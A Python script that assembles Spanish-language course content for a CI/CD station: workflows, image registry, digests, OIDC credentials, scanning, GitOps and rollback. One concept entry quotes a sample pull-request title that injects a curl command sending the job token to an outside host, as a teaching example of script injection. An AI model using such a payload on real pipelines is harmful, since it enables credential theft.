"""Arma content/estaciones/c01-cicd.json con las salidas reales de probar.sh y probar-fallas.sh.

    bash probar.sh /tmp/e8 && bash probar-fallas.sh /tmp/e8     # deja /tmp/e8.log y /tmp/e8.fallas.log
    python3 contenido.py /tmp/e8                                 # escribe el JSON con esas salidas

Ninguna salida se copia a mano: cada `salida` sale de una sección «### nombre» de los logs.
"""
import json
import re
import sys
from pathlib import Path

CARPETA = Path(sys.argv[1]) if len(sys.argv) > 1 else sys.exit("uso: python3 contenido.py <carpeta de probar.sh>")
SOL = Path(__file__).resolve().parent
APP = SOL.parent.parent
KIT = APP / "kits" / "c01-cicd"
LOG = Path(f"{CARPETA}.log").read_text()
LOGF = Path(f"{CARPETA}.fallas.log").read_text() if Path(f"{CARPETA}.fallas.log").exists() else ""
RUTA = str(CARPETA)


def L(nombre: str, log: str = None, filtro=None, max_lineas=None, quitar=None) -> str:
    log = LOG if log is None else log
    m = re.search(r"^### " + re.escape(nombre) + r"\n(.*?)(?=^### |\Z)", log, re.S | re.M)
    if not m:
        sys.exit(f"no está la sección «{nombre}»")
    lineas = m.group(1).rstrip("\n").replace(RUTA, "~/c01-cicd").splitlines()
    lineas = [ln for ln in lineas if not re.search(r"^(user|sys) [\d.]+$|Waiting$|^WARNING! |^Configure a credential|^https://docs.docker.com/go/credential", ln)]
    if filtro:
        lineas = [ln for ln in lineas if re.search(filtro, ln)]
    if quitar:
        lineas = [ln for ln in lineas if not re.search(quitar, ln)]
    if max_lineas:
        lineas = lineas[:max_lineas]
    return "\n".join(lineas).rstrip()


def F(nombre, **kw):
    return L(nombre, LOGF, **kw)


def code(rel: str, base: Path = SOL) -> str:
    return (base / rel).read_text().rstrip("\n")


def cmd(code_, salida, nota="", donde="mac"):
    return {"code": code_, "nota": nota, "donde": donde, "salida": salida}


def num(nombre: str, rx: str, log: str = None) -> str:
    m = re.search(rx, L(nombre, log))
    if not m:
        sys.exit(f"no encontré {rx!r} en «{nombre}»")
    return m.group(1)


V = "python verificar.py"
CREAR_S = num("p0 crear", r"(?m)^real ([\d.]+)")
MERGE_S = num("p6 merge", r"(?m)^real ([\d.]+)")
N_IMG = num("p1 describir", r"imágenes: (\d+)")
CAMINO = L("pc camino")
SEG_ECR = num("pc camino", r"= ([\d.]+) s al ECR")
SEG_TOTAL = num("pc camino", r"= ([\d.]+) s sin la aprobación")
ROLLBACK_S = num("p8 revert", r"(?m)^real ([\d.]+)")
N_BORRA = num("p7 vista", r"vista previa: (\d+) de")
SBOM_N = num("p4 sbom", r"SBOM: (\d+) paquetes")

e = {
    "id": "cicd", "patron": "sincrono", "caso": "c01", "num": 8,
    "titulo": "CI/CD y registro de imágenes", "nav": "CI/CD y registro",
    "pregunta": "Un cambio al gateway se acaba de juntar a main. ¿Qué tiene que pasar, solo y en orden, para que en producción corra exactamente la imagen que se probó, y para que volver a la anterior tarde segundos?",
    "version": "2026-11-18",
}

e["mapa"] = {
    "resumen": "La estación 7 dejó la receta de la imagen del gateway (su Dockerfile). Falta el camino que la lleva sola de un commit a producción. En cada PR, un <b>workflow</b> corre el lint y las pruebas, y la protección de main no deja juntar nada en rojo. Después del merge, el mismo workflow construye la imagen <b>una sola vez</b>, la prende para una prueba de humo, la escanea y solo entonces la sube al <b>registro de imágenes</b> (ECR), donde un tag nunca cambia de contenido. Desde ahí todo habla del <b>digest</b>, la huella exacta de lo que se probó: un cambio en el repositorio de despliegue la pone en staging y, con la aprobación de otra persona, en producción. Volver atrás es pedir el digest anterior.",
    "entra": [
        "un commit en <code>main</code> (antes, su PR), con el código del gateway y sus 30 pruebas",
        "la receta de la imagen (<code>gateway/Dockerfile</code>, de la estación 7)",
        "un repositorio de ECR para el gateway y un rol de AWS para el CI, del equipo de nube",
        "el repositorio de despliegue, con la imagen que corre en cada ambiente",
    ],
    "sale": [
        "la imagen del gateway en ECR, con el commit como tag inmutable y su digest",
        "el digest como salida del job, el mismo que corre en staging y en producción",
        "un cambio en el repositorio de despliegue por ambiente, aprobado por otra persona para producción",
        "una regla de retención que limpia lo viejo y deja siempre la imagen del rollback",
    ],
    "escala": [
        {"que": "El CI", "c01": "GitHub Actions, en máquinas de GitHub que se borran al terminar cada job", "taller": "la forja (<code>mundo/forja.py</code>): el mismo YAML de Actions, corrido en tu Mac en carpetas que se borran"},
        {"que": "El registro", "c01": "Amazon ECR en <code>us-east-1</code>: <code>classifier-gateway</code> (≈ 87 MB, 3 a 5 al día) y <code>classifier-triton</code> (≈ 9.2 GB, 1 al mes)", "taller": f"el ECR del dojo en <code>localhost:5800</code>: <code>classifier-gateway</code>, con {N_IMG} imágenes de las últimas semanas"},
        {"que": "Las credenciales del CI", "c01": "OIDC de GitHub → rol de IAM por 1 h → contraseña de ECR por 12 h", "taller": "el token OIDC lo firma la forja; <code>mundo/nube.py</code> revisa la trust policy y da la contraseña"},
        {"que": "El escaneo", "c01": "Trivy (o el que use la empresa) en el job, con la base de CVE del día, más el escaneo de ECR", "taller": "<code>mundo/escaner.py</code>, con los flags de Trivy y una base de avisos de ejemplo congelada"},
        {"que": "El despliegue", "c01": "un PR al repositorio de despliegue; Argo CD lo aplica en EKS; la política de admisión exige la firma de cosign", "taller": "un push al repositorio de despliegue; un hook corre <code>mundo/gitops.py</code>, que exige digest; sin firma"},
        {"que": "Del merge a producción", "c01": "≈ 17.5 min más la aprobación (con la paridad en la T4)", "taller": f"≈ {round(float(SEG_TOTAL))} s más la aprobación (sin paridad)"},
    ],
    "hoja": "https://cheat-sheets-ml.vercel.app/recorrido/#est-cicd",
}

e["precalculos"] = {
    "intro": "Antes de escribir el workflow, las cuentas de servilleta: cuánto tarda el camino del merge a producción, cuántos días cubre la regla de retención, cuánto ocupa el repositorio cuando las imágenes comparten capas y cuánto dura cada credencial del pipeline. Cada cuenta va en las dos escalas: C01 y el dojo.",
    "cuentas": [
        {
            "id": "camino", "pregunta": "¿Cuánto tarda un merge en llegar a producción?",
            "formula": "t = max(lint, pruebas) + imagen + staging + producción: lo que corre a la vez cuenta el más lento; lo que corre uno tras otro se suma",
            "c01": {"cuenta": "max(1, 2) + 1 (build, humo y escaneo) + 1 (push) + 5 (paridad en la T4) + 3.5 (staging) + 5 (producción)", "valor": "≈ 17.5 min, más lo que tarde la aprobación"},
            "taller": {"cuenta": "los segundos de cada job en la primera corrida de main", "valor": f"≈ {round(float(SEG_ECR))} s hasta el ECR · ≈ {round(float(SEG_TOTAL))} s hasta producción, más la aprobación"},
            "decide": "Qué va a la vez y qué en fila. Lint y pruebas no se esperan entre sí; la imagen espera a los dos, y producción espera a staging y a una persona. Si el camino se alarga, se acorta lo que está en fila (la caché del build, la paridad), no se salta la aprobación.",
            "conceptos": ["needs-if-outputs", "ambientes-aprobacion"],
            "comprueba": cmd("python -c \"\nimport json\nc = list(json.load(open('.forja/estado.json'))['corridas'].values())\nm = [x for x in c if x['evento'] == 'push' and x['jobs']['produccion']['result'] == 'success'][0]\ns = {j: r.get('seg', 0) for j, r in m['jobs'].items()}\nci = max(s['lint'], s['pruebas']) + s['imagen']\nprint(f\\\"max(lint {s['lint']}, pruebas {s['pruebas']}) + imagen {s['imagen']} = {ci:.1f} s al ECR · + staging {s['staging']} + produccion {s['produccion']} = {ci + s['staging'] + s['produccion']:.1f} s sin la aprobación\\\")\"", CAMINO),
            "confirma": "el paso 6: <code>python mundo/forja.py corrida &lt;id&gt;</code> muestra los segundos de cada job y de cada paso.",
        },
        {
            "id": "retencion", "pregunta": "¿Cuántos días hacia atrás alcanza la regla de retención?",
            "formula": "d = N / m: N imágenes que guarda la regla entre m imágenes nuevas al día",
            "c01": {"cuenta": "N = 200, m = 3 a 5 merges al día", "valor": "≈ 40 a 67 días"},
            "taller": {"cuenta": "N = 30, m = 35 imágenes en 45 días ≈ 0.78 al día", "valor": "≈ 39 días"},
            "decide": "Se cuentan imágenes y no días porque la regla no sabe qué corre: «borra lo de más de 30 días» borraría la versión estable si nadie despliega en un mes, y con ella el rollback. Contando, la que corre y la anterior siempre están entre las más nuevas mientras N alcance.",
            "conceptos": ["retencion", "rollback"],
            "comprueba": cmd("python -c \"\nfor nombre, N, m in [('C01, gateway (3 a 5 merges al día)', 200, 4), ('dojo (35 imágenes en 45 días)', 30, 35 / 45)]:\n    print(f'{nombre}: d = N / m = {N} / {m:.2f} = {N / m:.0f} días')\"", L("pc retencion")),
            "confirma": f"el paso 7: la vista previa de la regla borraría {N_BORRA} imágenes hoy (las 2 sin tag y las más viejas) y deja la actual y la anterior de cada ambiente.",
        },
        {
            "id": "capas", "pregunta": "¿Cuánto ocupan 200 imágenes del gateway en el registro?",
            "formula": "S = A + N × δ: las capas que comparten todas (A) se guardan una vez; cada imagen agrega solo la suya (δ)",
            "c01": {"cuenta": "A = 87 MB (base + entorno), δ = 0.048 MB (el código), N = 200", "valor": "≈ 97 MB, contra ≈ 17.4 GB si cada imagen se guardara entera"},
            "taller": {"cuenta": "<code>docker history</code>: el código pesa ≈ 41 kB y la ficha del modelo ≈ 16 kB; lo demás es la base y el entorno", "valor": "un push después de un cambio de código sube kilobytes, no la imagen entera"},
            "decide": "Guardar dos meses de imágenes cuesta casi nada: la retención no está para ahorrar, está para que la lista no crezca sin fin y para que el rollback siempre encuentre su imagen. Y el orden del Dockerfile (dependencias antes que el código) es lo que hace que las capas se compartan.",
            "conceptos": ["registro-imagenes", "retencion"],
            "comprueba": cmd("docker history --format '{{.Size}}\\t{{.CreatedBy}}' $IMG | cut -c1-110 | head -9", L("p4 capas")),
            "confirma": "el paso 6: en el log del push, las capas de la base y del entorno dicen «Layer already exists»; solo viajan las nuevas.",
        },
        {
            "id": "credenciales", "pregunta": "¿Cuánto dura cada credencial del pipeline, y alcanza para el job?",
            "formula": "cada credencial dura más que el trabajo que la usa, y no mucho más",
            "c01": {"cuenta": "token OIDC (de vida corta: solo sirve para cambiarlo) → rol de IAM (1 h por omisión) → contraseña de ECR (12 h); el job imagen tarda ≈ 2 min", "valor": "una hora sobra; nadie guarda una llave «para no batallar»"},
            "taller": {"cuenta": "token OIDC de la forja: 5 min (GitHub no publica la cifra; solo dice que es corto) · contraseña de ECR: 12 h · timeout del job imagen: 20 min", "valor": "el job usa el token a los pocos segundos de arrancar; la contraseña muere con la carpeta del job"},
            "decide": "Por qué OIDC y no una llave guardada como secreto: una llave sirve para siempre y desde cualquier lugar; una credencial por OIDC sirve horas, solo para ese rol y solo si la pidió el job correcto. Si alguien la roba de un log, le quedan horas, no años.",
            "conceptos": ["oidc", "permisos-minimos"],
            "comprueba": cmd("python -c \"\nfor nombre, dura_min in [('token OIDC del dojo', 5), ('contraseña de ECR', 12 * 60), ('timeout del job imagen', 20)]:\n    print(f'{nombre}: {dura_min} min')\"", L("pc credenciales")),
            "confirma": "el paso 5: sin el token del job, <code>get-login-password</code> no da nada; en el paso 6, el log del push dice qué rol se asumió y para qué <code>sub</code>.",
        },
    ],
}

conceptos = [
    {"id": "ci-cd", "termino": "CI/CD", "en": "continuous integration / continuous delivery",
     "def": "CI: cada cambio se prueba solo, en una máquina limpia, antes de juntarse. CD: lo que pasó las pruebas llega solo a producción, por el mismo camino cada vez.",
     "analogia": "Una línea de ensamble con inspecciones: ninguna pieza pasa a la siguiente estación sin el sello de la anterior, y el camino es el mismo para todas.",
     "importa": "CI/CD no termina cuando las pruebas salen en verde: termina cuando la imagen probada corre en producción. Lo que no está en el camino (un build a mano, un push desde una laptop) no tiene sello.",
     "trampa": "Tener CI sin CD: las pruebas pasan y alguien construye «la buena» en su máquina para desplegarla. Esa imagen nunca se probó."},
    {"id": "workflow-actions", "termino": "Workflow, job, paso y runner", "en": "GitHub Actions workflow / job / step / runner",
     "def": "Un workflow es un YAML en <code>.github/workflows/</code>: qué hacer y cuándo. Tiene jobs; cada job corre en una máquina limpia (el runner) con pasos: un comando (<code>run</code>) o una acción (<code>uses</code>).",
     "analogia": "Una receta con varias estaciones de cocina: cada estación (job) empieza con la mesa limpia y sigue sus pasos; lo único que pasa de una a otra es lo que se manda por la ventanilla.",
     "importa": "Cada job empieza sin nada: ni lo que construyó otro job ni las credenciales de otro. Por eso el digest tiene que salir como output, y por eso cada job pide sus propios permisos.",
     "trampa": "Escribir en YAML un comando con « #» sin bloque (<code>run: |</code>): YAML lo toma por comentario y el comando queda cortado."},
    {"id": "disparadores", "termino": "Disparadores y el merge de prueba", "en": "workflow triggers / pull request merge commit",
     "def": "<code>on</code> dice qué eventos corren el workflow: <code>pull_request</code> (cada PR) y <code>push</code> a <code>main</code>. En un PR se prueba un merge de prueba de tu rama con main, que no existe en ninguna rama.",
     "analogia": "Probarte la ropa en el probador antes de comprarla: lo que ves en el espejo es cómo se vería, todavía no es tuya.",
     "importa": "Por eso en un PR se prueba y nada más: una imagen con el nombre de ese commit no la explicaría nadie, y un PR puede traer código que nadie revisó. La imagen sale solo de main.",
     "trampa": "Publicar imágenes desde el PR «para ganar tiempo»: nombres que no son commits de main y código sin revisar en el registro de producción."},
    {"id": "check-obligatorio", "termino": "Check obligatorio", "en": "required status check / branch protection",
     "def": "Una regla de la rama main: un PR no se puede juntar si un job con cierto nombre (aquí, <code>pruebas</code>) no terminó en verde. Un job saltado por <code>if</code> cuenta como verde; uno que nunca arrancó, no.",
     "analogia": "El sello de calidad en la puerta del almacén: sin sello no entra, y si nadie está sellando, no entra nada.",
     "importa": "Sin la regla, el rojo del PR sería un consejo. Con ella, el workflow tiene que reportar ese nombre en TODOS los PR: un filtro de carpetas (<code>paths</code>) deja PRs esperando para siempre.",
     "trampa": "Filtrar el workflow por carpetas con un check obligatorio: un PR que solo cambia un README nunca reporta <code>pruebas</code> y no se puede juntar."},
    {"id": "needs-if-outputs", "termino": "needs, if y outputs", "en": "job dependencies / conditions / outputs",
     "def": "<code>needs</code> hace que un job espere a otros (y se salte si uno falló); <code>if</code> decide si corre; <code>outputs</code> saca un texto corto del job (de <code>$GITHUB_OUTPUT</code>) para los jobs de abajo.",
     "analogia": "Una carrera de relevos: el siguiente no arranca hasta recibir la estafeta, y la estafeta (el digest) es lo único que pasa de mano en mano.",
     "importa": "La cadena lint/pruebas → imagen → staging → producción sale de <code>needs</code>; la separación PR/main, de <code>if</code>; y que staging y producción usen exactamente lo que probó el job imagen, de <code>outputs</code>.",
     "trampa": "Que staging vuelva a calcular «la imagen de este commit» por su tag: si el tag se movió, despliega otra cosa."},
    {"id": "registro-imagenes", "termino": "Registro de imágenes", "en": "container registry (Amazon ECR)",
     "def": "El almacén de imágenes con nombre al que el CI sube (<code>push</code>) y del que los nodos bajan (<code>pull</code>). Guarda cada capa una vez, con su huella, y una lista (el manifest) de qué capas forman cada imagen.",
     "analogia": "Una bodega de piezas numeradas: si dos muebles usan la misma pieza, la bodega guarda una y anota en cada plano cuál usar.",
     "importa": "El job de CI se borra al terminar; la imagen tiene que vivir en un lugar fijo y con permisos: el CI sube, los nodos solo bajan. Al subir, solo viajan las capas que el registro no tiene.",
     "trampa": "Confundirlo con el registro de modelos (MLflow): uno guarda programas empaquetados; el otro, versiones del modelo con sus alias."},
    {"id": "tag-digest", "termino": "Tag y digest", "en": "image tag / image digest",
     "def": "El tag es un nombre legible que alguien escoge (<code>3f9c2ab</code>, el commit). El digest es el sha256 del manifest de la imagen (<code>sha256:…</code>): si cambia un byte, cambia el digest. El tag apunta a un digest.",
     "analogia": "El nombre de un contacto en tu teléfono y su número: el nombre lo puedes reasignar a otro número; el número es el que suena.",
     "importa": "Pedir por digest siempre baja lo mismo, y el que baja comprueba que lo recibido tenga esa huella. Por eso lo que viaja por el pipeline y lo que se despliega es el digest.",
     "trampa": "<code>:latest</code>: no dice qué código es, cambia sin avisar y dos nodos que lo bajan con una hora de diferencia pueden correr cosas distintas."},
    {"id": "tag-inmutable", "termino": "Tags inmutables", "en": "tag immutability",
     "def": "Una opción del repositorio de ECR: si un tag ya existe con otro contenido, el registro rechaza el push. En ECR no viene prendida.",
     "analogia": "Un acta firmada: si te equivocaste, haces otra con otro folio; no se borra y se reescribe la misma.",
     "importa": "Una reconstrucción casi nunca da los mismos bytes (cambian fechas dentro de la imagen). Sin inmutabilidad, un rerun mueve el tag y el nombre deja de decir qué se probó. Con ella, el rerun falla en el push (<code>ImageTagAlreadyExistsException</code>), y eso no es un bug. ECR también tiene variantes con excepciones por patrón de tag.",
     "trampa": "Desactivarla para que «el rerun pase»: la imagen de ese commit ya existe; no hay nada que volver a subir."},
    {"id": "construir-una-vez", "termino": "Construir una vez y promover", "en": "build once, promote",
     "def": "La imagen se construye una sola vez, en CI, y lo que avanza de un ambiente al siguiente es su digest. Entre ambientes cambia la configuración (aquí, <code>TRITON_URL</code>), nunca la imagen.",
     "analogia": "Un pastel que se hornea una vez y pasa de la cocina al mostrador: no se hornea otro para el mostrador «igual al de la cocina».",
     "importa": "Staging y producción corren los mismos bytes: lo que pasó en staging vale para producción. Y el rollback es volver a pedir un digest que ya existe.",
     "trampa": "Reconstruir para producción «desde el mismo commit»: otra imagen, que nadie probó."},
    {"id": "prueba-humo-imagen", "termino": "Prueba de humo de la imagen", "en": "image smoke test",
     "def": "Antes de subirla, prender un contenedor de la imagen recién construida con su configuración y pedirle lo mínimo: <code>/healthz</code> en 200 y una foto clasificada.",
     "analogia": "Encender el aparato en la tienda antes de llevártelo: no pruebas todo, pero sabes que no llega muerto a casa.",
     "importa": "Las pruebas corren el código; el humo corre la imagen: el Dockerfile, las dependencias instaladas, el usuario, el puerto, el comando. Una imagen que no arranca nunca llega al registro.",
     "trampa": "Dejar el contenedor de prueba vivo si algo falla: el siguiente job encuentra el puerto ocupado. Un <code>trap</code> lo apaga siempre."},
    {"id": "sbom-escaneo", "termino": "SBOM y escaneo de vulnerabilidades", "en": "SBOM / vulnerability scanning / CVE",
     "def": "El SBOM es el inventario de lo que trae la imagen (paquetes y versiones). El escáner lo cruza con una base de vulnerabilidades conocidas (los CVE), cada una con su severidad y, si existe, la versión que la corrige.",
     "analogia": "La lista de ingredientes de un producto, comparada con la lista de lotes retirados del mercado.",
     "importa": "La regla del equipo: falla con un aviso CRITICAL que ya tiene parche, antes del push. Uno sin parche no se arregla subiendo una versión, y bloquear por él dejaría al equipo sin publicar. Las excepciones van en un archivo, con motivo y fecha de vencimiento, y pasan por revisión.",
     "trampa": "Una excepción sin fecha, o para un aviso que sí aplica: el escáner se calla para siempre."},
    {"id": "oidc", "termino": "Credenciales sin llaves: OIDC", "en": "OIDC federation / AssumeRoleWithWebIdentity / trust policy",
     "def": "El job pide a GitHub un token firmado (OIDC) que dice quién es: repositorio, rama o PR, ambiente. AWS lo cambia por credenciales de un rol si la trust policy lo acepta, según su claim <code>sub</code>.",
     "analogia": "Un gafete de visitante que te dan en recepción al mostrar tu credencial: abre solo ciertas puertas y vence en la tarde.",
     "importa": "Nadie guarda una llave de AWS en el repositorio. Si la trust policy pide <code>sub</code> exacto de main, un PR (que tiene otro <code>sub</code>) no puede subir imágenes aunque su código lo intente.",
     "trampa": "Abrir la trust policy con <code>StringLike repo:org/repo:*</code> «para no batallar»: cualquier workflow del repositorio, incluido el de un PR, recibe las credenciales."},
    {"id": "permisos-minimos", "termino": "Permisos mínimos del workflow", "en": "least privilege / workflow permissions / GITHUB_TOKEN",
     "def": "<code>permissions</code> dice qué puede hacer el token de cada job. Arriba, lo mínimo (<code>contents: read</code>); el job que sube la imagen agrega <code>id-token: write</code>, que solo deja pedir el token OIDC.",
     "analogia": "Las llaves de un edificio: cada quien recibe las de su piso, y la llave maestra no anda colgada en la entrada.",
     "importa": "Si un paso se compromete (una acción de terceros, un comando inyectado), solo puede hacer lo que su job podía. Por eso las acciones de terceros se fijan por el hash de su commit.",
     "trampa": "Poner <code>id-token: write</code> arriba, para todos los jobs: el lint de un PR también podría pedir el token."},
    {"id": "inyeccion-expresiones", "termino": "Inyección en un run", "en": "script injection via expressions",
     "def": "GitHub sustituye cada <code>${{ … }}</code> en el texto del paso ANTES de correrlo. Si el texto viene de fuera (el título de un PR, el nombre de una rama), se vuelve parte del comando.",
     "analogia": "Un formulario donde lo que escribes en «nombre» se pega tal cual en una orden: alguien escribe «Juan; y además abre la caja fuerte».",
     "importa": "Un PR titulado <code>x\"; curl https://otro-sitio/$TOKEN; echo \"</code> corre en tu runner. La forma segura: pasar el texto como variable de entorno (<code>env:</code>) y usar <code>\"$TITULO\"</code>, que la terminal trata como texto.",
     "trampa": "Creer que un <code>echo</code> no hace daño: el daño no está en el echo, está en lo que el título cierra y abre."},
    {"id": "gitops", "termino": "GitOps y el repositorio de despliegue", "en": "GitOps / desired state / reconciliation",
     "def": "Un repositorio aparte dice qué imagen corre en cada ambiente. Un programa (Argo CD en C01, un hook aquí) compara lo que dice con lo que corre y aplica la diferencia. Desplegar es un commit.",
     "analogia": "La partitura y la orquesta: si alguien quiere otra música, cambia la partitura; el director hace que la orquesta toque lo escrito.",
     "importa": "Cada despliegue queda en la historia de git, con quién y cuándo. El rollback es un <code>git revert</code>. Y la política de admisión rechaza lo que no venga por digest del registro del proyecto.",
     "trampa": "Cambiar lo que corre a mano (un <code>docker run</code>, un <code>kubectl set image</code>) sin tocar el repositorio: en la siguiente reconciliación vuelve lo que dice git."},
    {"id": "ambientes-aprobacion", "termino": "Ambientes y aprobación", "en": "deployment environments / required reviewers",
     "def": "Un job que usa <code>environment: produccion</code> espera a que alguien de la lista de revisores lo apruebe. La regla <code>prohibir_autoaprobacion</code> impide que quien disparó la corrida se apruebe a sí mismo.",
     "analogia": "Dos llaves para abrir la bóveda: quien prepara el envío no es quien lo autoriza.",
     "importa": "Producción recibe solo lo que pasó staging y lo que vio otra persona. La aprobación no es un trámite: es el momento de mirar el humo de staging y las métricas.",
     "trampa": "Una sola persona en la lista de revisores, que además es quien hace todos los merges: la regla existe pero no protege nada."},
    {"id": "retencion", "termino": "Regla de retención", "en": "ECR lifecycle policy",
     "def": "Las reglas del repositorio que borran imágenes solas: por número (<code>imageCountMoreThan</code>) o por edad (<code>sinceImagePushed</code>), con tag o sin tag. A cada imagen la decide la primera regla que la toma.",
     "analogia": "La regla de un refrigerador compartido: lo que no tiene nombre se tira al día siguiente, y de cada quien se guardan los últimos 30 tuppers.",
     "importa": "ECR no sabe qué imagen corre en el clúster. Una regla por días borraría la versión estable si nadie despliega en un mes. Contando imágenes, la actual y la anterior (el rollback) siempre están entre las más nuevas.",
     "trampa": "Recortar la regla «para ahorrar» desde la consola: el ahorro es de centavos y se va la imagen del rollback."},
    {"id": "rollback", "termino": "Rollback", "en": "rollback",
     "def": "Volver a la versión anterior. Con este diseño: un <code>git revert</code> en el repositorio de despliegue, que vuelve a pedir el digest anterior, que sigue en el registro.",
     "analogia": "Ctrl+Z sobre la partitura: la orquesta vuelve a tocar lo de antes, sin ensayar nada nuevo.",
     "importa": f"No se reconstruye nada: la imagen anterior ya existe, ya se probó y los nodos quizá ya la tienen. En el dojo tardó ≈ {round(float(ROLLBACK_S))} s.",
     "trampa": "«Rollback» reconstruyendo el commit viejo: otro digest, sin probar, en el peor momento para descubrirlo."},
]
e["conceptos"] = conceptos

e["mundo"] = {
    "resumen": "El kit trae el marketplace de C01 un día normal: el gateway de la estación 6 con su receta de la estación 7 corre en staging y en producción, por digest. Hay un GitHub del dojo (la forja) con el repositorio <code>dojo/classifier</code> y sus reglas, un AWS del dojo con un ECR (con seis semanas de imágenes, dos sin tag) y el rol del CI, un repositorio de despliegue con su GitOps, y un Triton con un modelo de juguete del mismo contrato que <code>classifier</code> v4. Falta el camino: el workflow.",
    "trae": [
        {"que": "El ECR del dojo y el Triton del dojo (compose.yaml)", "detalle": "Un proxy con las reglas de ECR (repositorios, credenciales que vencen, permisos por rol, tags inmutables) delante de <code>registry:2</code>, en <code>localhost:5800</code>; y el servidor de modelos de la estación 6 con un modelo de juguete, en <code>localhost:8800</code>."},
        {"que": "mundo/crear.py", "detalle": f"Crea todo en ≈ {round(float(CREAR_S))} s: la carpeta como repositorio con su <code>origin</code> en la forja, el repositorio de despliegue con su hook, la historia del ECR y la imagen de hoy corriendo en los dos ambientes."},
        {"que": "La forja (mundo/forja.py y mundo/acciones.py)", "detalle": "PRs con merge de prueba, la protección de main (<code>mundo/forja.yaml</code>), merges, corridas, logs, rerun y la aprobación de ambientes. Corre tu workflow con las reglas de GitHub Actions: <code>on</code>, <code>needs</code>, <code>if</code>, <code>outputs</code>, <code>permissions</code>, <code>environment</code>, <code>$GITHUB_OUTPUT</code>."},
        {"que": "La nube (mundo/nube.py)", "detalle": "Cambia el token OIDC de un job por la contraseña de ECR si la trust policy del rol (<code>mundo/nube/confianza.json</code>) lo acepta; y los comandos de ECR: describir, imágenes, inmutabilidad y la regla de retención con su vista previa."},
        {"que": "El GitOps (mundo/gitops.py)", "detalle": "Cada push al repositorio de despliegue pone a correr en staging (8801) y en producción (8802) lo que dice, con el rol de los nodos (solo bajar) y una política de admisión que exige digest."},
        {"que": "El escáner (mundo/escaner.py)", "detalle": "Con los flags de Trivy: SBOM en CycloneDX y hallazgos contra una base de avisos congelada. Los avisos son de ejemplo (DOJO-2026-…), no CVE reales."},
        {"que": "gateway/", "detalle": "El gateway de la estación 6, su <code>Dockerfile</code> y sus 30 pruebas, ya escritos. Aquí no se toca el código: se construye, se prueba y se publica."},
        {"que": "verificar.py y romper.py", "detalle": "12 checks con los criterios de «listo» y 6 fallas en el mundo, la configuración o la infraestructura, nunca en lo que escribes."},
    ],
    "tu_pipeline": [
        {"archivo": ".github/workflows/gateway.yml", "hace": "El workflow: lint y pruebas en cada PR; después del merge, la imagen, staging y producción con aprobación, con el digest como salida."},
        {"archivo": "ci/humo.sh y ci/escaneo.sh", "hace": "La prueba de humo de la imagen y su SBOM y escaneo, antes del push."},
        {"archivo": "ci/push.sh", "hace": "Entra a ECR con el rol del CI por OIDC, sube la imagen y deja su digest en <code>$GITHUB_OUTPUT</code>."},
        {"archivo": "ci/desplegar.sh", "hace": "Cambia la imagen de un ambiente en el repositorio de despliegue (por digest), la sube y comprueba que corre."},
        {"archivo": "infra/ecr-retencion.json y .trivyignore.yaml", "hace": "La regla de retención del repositorio de ECR y las excepciones del escaneo, con motivo y fecha."},
    ],
    "requisitos": [
        "Docker Desktop corriendo, con ≈ 1 GB libre para las imágenes (base de Python, registry:2 y las del mundo)",
        "Python 3.11 o más nuevo (se probó con 3.14.3) y ≈ 250 MB para el entorno virtual",
        "git (con tu nombre y correo configurados) y curl",
        "Internet la primera vez (los paquetes y las imágenes base)",
        "Los puertos 5800, 8800, 8801 y 8802 libres en tu Mac",
    ],
    "sustituciones": [
        {"nube": "GitHub y GitHub Actions (runners de GitHub)", "local": "la forja: <code>mundo/forja.py</code> y <code>mundo/acciones.py</code>", "diferencia": "El mismo YAML y las mismas reglas de <code>needs</code>, <code>if</code>, <code>outputs</code>, <code>permissions</code> y <code>environment</code>. Los jobs corren en tu Mac (con el Python del kit y el Docker de tu Mac, con su caché), no en máquinas virtuales; solo <code>actions/checkout</code> como <code>uses</code>."},
        {"nube": "Amazon ECR", "local": "el ECR del dojo en <code>localhost:5800</code>", "diferencia": "Un proxy con las reglas de ECR delante de <code>registry:2</code>, sin TLS. El escaneo de ECR no está: el del job es el único."},
        {"nube": "OIDC de GitHub y AWS STS", "local": "la forja firma el token; <code>mundo/nube.py</code> revisa la trust policy", "diferencia": "La misma trust policy y los mismos claims (<code>sub</code>, <code>aud</code>). En GitHub el token se firma con una llave privada y AWS lo comprueba con la pública; aquí, con un secreto compartido."},
        {"nube": "Trivy con la base de CVE del día", "local": "<code>mundo/escaner.py</code> con avisos de ejemplo congelados", "diferencia": "Los mismos flags (<code>--severity</code>, <code>--ignore-unfixed</code>, <code>--exit-code</code>, <code>--ignorefile</code>) y el mismo formato de excepciones; los avisos no son reales."},
        {"nube": "Argo CD sobre EKS, con cosign y una política de admisión", "local": "un hook de git que corre <code>mundo/gitops.py</code> y dos contenedores", "diferencia": "La misma idea (el repositorio manda, por digest), sin firma de la imagen ni rollout de copia en copia."},
        {"nube": "<code>linux/amd64</code> y la paridad en la T4", "local": "la arquitectura de tu Mac (arm64), sin paridad", "diferencia": "En C01 el build apunta a la arquitectura de los nodos; aquí la de tu Mac, para no emular. La paridad de punta a punta necesita la GPU."},
    ],
    "arranque": "unzip c01-cicd.zip && cd c01-cicd\npython3 -m venv .venv && source .venv/bin/activate\npip install -r requirements.txt\ndocker compose up -d --wait --build\npython mundo/crear.py\npython verificar.py mundo reglas",
    "python": "python",
}

G = []
G.append(dict(n=0, id="mundo", titulo="Levantar el mundo", objetivo="El ECR y el Triton del dojo arriba, el mundo creado, la carpeta en git con su origin en la forja y los dos ambientes corriendo.",
    conceptos=["ci-cd"],
    explica="<code>docker compose</code> levanta el ECR del dojo y el Triton (la primera vez construye sus dos imágenes chicas). <code>mundo/crear.py</code> hace de esta carpeta un repositorio con su <code>origin</code> en la forja, llena el ECR con seis semanas de imágenes y pone la de hoy en staging y en producción.",
    codigo=[],
    comandos=[
        cmd("python3 -m venv .venv && source .venv/bin/activate\npip install -r requirements.txt", L("p0 venv")),
        cmd("docker compose up -d --wait --build", L("p0 up")),
        cmd("python mundo/crear.py", L("p0 crear", quitar=r"^real ")),
        cmd(f"{V} mundo reglas", L("p0 verificar", quitar=r"^$")),
    ],
    verifica="<code>mundo</code> y <code>reglas</code> en verde.",
    ojo="Si un puerto está ocupado (5800, 8800, 8801 u 8802), <code>docker compose up</code> o <code>crear.py</code> lo dicen. Si ya creaste el mundo y quieres empezar de nuevo: <code>python mundo/crear.py --de-nuevo</code>."))

G.append(dict(n=1, id="mirar", titulo="Mirar el registro, los nombres y lo que corre", objetivo="Leer el ECR (tags, digests, fechas), el repositorio de despliegue y lo que corre en cada ambiente.",
    conceptos=["registro-imagenes", "tag-digest", "gitops"],
